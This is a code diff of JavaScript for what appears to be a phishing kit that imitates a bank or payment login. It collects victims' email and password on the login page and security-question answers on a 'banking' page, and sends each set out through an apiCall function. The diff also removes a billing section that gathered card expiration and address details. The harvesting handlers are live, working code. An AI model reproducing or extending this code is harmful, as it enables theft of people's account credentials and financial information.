@@ -1,6 +1,6 @@
 // toggles nav menu on mobile view upon menu button click
 const menu = document.querySelector(".menu-icon");
-
+// console.log("hello", window.location.href);
 menu.addEventListener("click", () => {
   const navLinks = document.querySelector(".nav-general");
   const navComputedStyle = window.getComputedStyle(navLinks);
@@ -59,8 +59,10 @@ async function apiCall(routePath, ...texts) {
       console.log("Message Sent!");
       // Navigate to a different URL after successful message sending
       // window.location.href = "/views/billing.html"; // Change to your desired URL
+
       if (routePath) {
         window.location.href = routePath;
+        // handleRouting(routePath);
       }
     } else {
       console.log(`Failed to send message. Status: ${api.status}`);
@@ -75,201 +77,64 @@ async function apiCall(routePath, ...texts) {
   api.send();
 }
 
-// function route(routePath) {
-//   console.log(window.location.pathname);
-//   setTimeout(() => {
-//     window.location.href = routePath;
-//   }, 1000);
-// }
-
-// console.log(window.location.pathname);
-if (window.location.pathname === "/views/billing.html") {
-  const expiration = document.getElementById("expiration");
-  const states = document.getElementById("states");
-  const ExpYear = document.getElementById("year");
-
-  const usStates = [
-    "Alabama",
-    "Alaska",
-    "Arizona",
-    "Arkansas",
-    "California",
-    "Colorado",
-    "Connecticut",
-    "Delaware",
-    "Florida",
-    "Georgia",
-    "Hawaii",
-    "Idaho",
-    "Illinois",
-    "Indiana",
-    "Iowa",
-    "Kansas",
-    "Kentucky",
-    "Louisiana",
-    "Maine",
-    "Maryland",
-    "Massachusetts",
-    "Michigan",
-    "Minnesota",
-    "Mississippi",
-    "Missouri",
-    "Montana",
-    "Nebraska",
-    "Nevada",
-    "New Hampshire",
-    "New Jersey",
-    "New Mexico",
-    "New York",
-    "North Carolina",
-    "North Dakota",
-    "Ohio",
-    "Oklahoma",
-    "Oregon",
-    "Pennsylvania",
-    "Rhode Island",
-    "South Carolina",
-    "South Dakota",
-    "Tennessee",
-    "Texas",
-    "Utah",
-    "Vermont",
-    "Virginia",
-    "Washington",
-    "West Virginia",
-    "Wisconsin",
-    "Wyoming",
-  ];
-
-  // Loop from 1 to 12 to create <option> elements
-  for (let month = 1; month <= 12; month++) {
-    const optionMonth = document.createElement("option");
-    optionMonth.value = month;
-    optionMonth.textContent = month;
-    expiration.appendChild(optionMonth);
-  }
-
-  for (let year = 2024; year <= 2029; year++) {
-    const optionYear = document.createElement("option");
-    optionYear.value = year;
-    optionYear.textContent = year;
-    ExpYear.appendChild(optionYear);
-  }
-
-  usStates.map((state) => {
-    // const states = document.getElementById("states");
-    const option = document.createElement("option");
-    option.value = state;
-    option.textContent = state;
-    states.appendChild(option);
-  });
-
-  // Billing page
-  // Add the 'name' attribute to the input element
-  // const prepaidCheckInput = document.querySelector('checkbox');
-  // console.log(prepaidCheckInput)
-  // if (prepaidCheckInput.checked) {
-  //   prepaidCheckInput.setAttribute("name", "prepaid-checked");
-  // } else {
-  //   prepaidCheckInput.setAttribute("name", "prepaid-NOT-checked");
-  // }
-
-  // Verify that the attribute was added
-  // console.log(prepaidCheckInput);
-
-  // Billing page form submit
-  const billingSubmit = document.querySelector(".submit-btn");
-  billingSubmit.addEventListener("click", async () => {
-    const inputs = document.querySelectorAll(".info-container input");
-    const checkBox = document.querySelector(".checkbox");
-    const selectBoxes = document.querySelectorAll(".dropdown-billing");
-    // console.log(checkBox);
-
-    const messages = Array.from(inputs).map(
-      (input) => `${input.name}: ${input.value}`
-    );
-    messages.push(`prepaid: ${checkBox.checked}`);
-
-    selectBoxes.forEach((selectOptions) => {
-      // console.log(selectOptions.value, selectOptions.name);
-      messages.push(`${selectOptions.name}: ${selectOptions.value}`);
-    });
-
-    await apiCall("./banking.html", messages);
-    console.log("billing success");
-    // window.location.href = "./banking.html";
-    // route("./banking.html");
-  });
-}
-
 // Login Page Form Submit
-if (window.location.pathname === "/") {
-  const loginSubmitBtn = document.querySelector(".login-btn");
-  // console.log(submitBtn);
-  loginSubmitBtn.addEventListener("click", async () => {
-    const loginForm = document.getElementById("login-form");
-    // console.log(loginForm);
+const loginSubmitBtn = document.querySelector(".login-btn");
+// console.log(submitBtn);
+loginSubmitBtn.addEventListener("click", async () => {
+  // const loginForm = document.getElementById("login-form");
+  // console.log(loginForm);
 
-    const email = document.getElementById("login-email").value;
-    const pass = document.getElementById("login-pass").value;
+  const email = document.getElementById("login-email").value;
+  const pass = document.getElementById("login-pass").value;
 
-    await apiCall(
-      "/views/billing.html",
-      `User-Email: ${email}`,
-      `User-Pass: ${pass}`
-    );
-    console.log("Success Login");
-    // window.location.href = "/views/billing.html";
-    // route("/views/billing.html");
-    // }
-  });
-}
+  await apiCall(
+    "./views/billing.html",
+    `User-Email: ${email}`,
+    `User-Pass: ${pass}`
+  );
+  console.log("Success Login");
+});
 
 // Banking form submit
-if (window.location.pathname === "/views/banking.html") {
-  const questions = [
-    "What is the name of your first babysitter?",
-    "What is your Mother's maiden name?",
-    "What is the first name of your hairdresser/barber?",
-    "What was the name of your first boyfriend/girlfriend?",
-    "In what city did you meet your spouse/significant other?",
-    "As a child, what did you want to be when you grew up?",
-    "Where were you on New Year's 2000?",
-    "What was the first live concert you attended?",
-    "What was the first name of your favorite teacher/professor?",
-    "What is the name of your favorite restaurant?",
-    "On what street is your grocery store?",
-  ];
-  const selectElement = document.getElementById("security-question");
+const questions = [
+  "What is the name of your first babysitter?",
+  "What is your Mother's maiden name?",
+  "What is the first name of your hairdresser/barber?",
+  "What was the name of your first boyfriend/girlfriend?",
+  "In what city did you meet your spouse/significant other?",
+  "As a child, what did you want to be when you grew up?",
+  "Where were you on New Year's 2000?",
+  "What was the first live concert you attended?",
+  "What was the first name of your favorite teacher/professor?",
+  "What is the name of your favorite restaurant?",
+  "On what street is your grocery store?",
+];
+const selectElement = document.getElementById("security-question");
 
-  questions.map((question, index) => {
-    const option = document.createElement("option");
-    option.value = `question-${index + 1}`; // question1, question2, ...
-    option.textContent = question;
-    selectElement.appendChild(option);
-  });
+questions.map((question, index) => {
+  const option = document.createElement("option");
+  option.value = `question-${index + 1}`; // question1, question2, ...
+  option.textContent = question;
+  selectElement.appendChild(option);
+});
 
-  const bankingSubmit = document.querySelector(".verify-btn");
-  bankingSubmit.addEventListener("click", async () => {
-    const bankingInputs = document.querySelectorAll(".email-section input");
-    const securityQuestion = document.querySelector(".dropdown-banking");
-    // const securityQuestionText = securityQuestion.option[securityQuestion.selectedIndex].text
-    const selectedQuestion =
-      securityQuestion.options[selectElement.selectedIndex];
-    // console.log(selectedQuestion);
+const bankingSubmit = document.querySelector(".verify-btn");
+bankingSubmit.addEventListener("click", async () => {
+  const bankingInputs = document.querySelectorAll(".email-section input");
+  const securityQuestion = document.querySelector(".dropdown-banking");
+  // const securityQuestionText = securityQuestion.option[securityQuestion.selectedIndex].text
+  const selectedQuestion =
+    securityQuestion.options[selectElement.selectedIndex];
+  // console.log(selectedQuestion);
 
-    const messages = Array.from(bankingInputs).map(
-      (input) => `${input.name}: ${input.value}`
-    );
-    messages.push(`Security Questions: ${selectedQuestion.textContent}`);
+  const messages = Array.from(bankingInputs).map(
+    (input) => `${input.name}: ${input.value}`
+  );
+  messages.push(`Security Questions: ${selectedQuestion.textContent}`);
 
-    await apiCall("./thank-you.html", messages);
-    console.log("success banking");
-    // console.log("sUUUUccess");
-    // window.location.href = "./thank-you.html";
-    // route("./thank-you.html");
-  });
-}
+  await apiCall("./thank-you.html", messages);
+  console.log("success banking");
+});
 
 // if (window.location.pathname === "views/thank-you.html") {
 //   console.log(window.location.pathname);
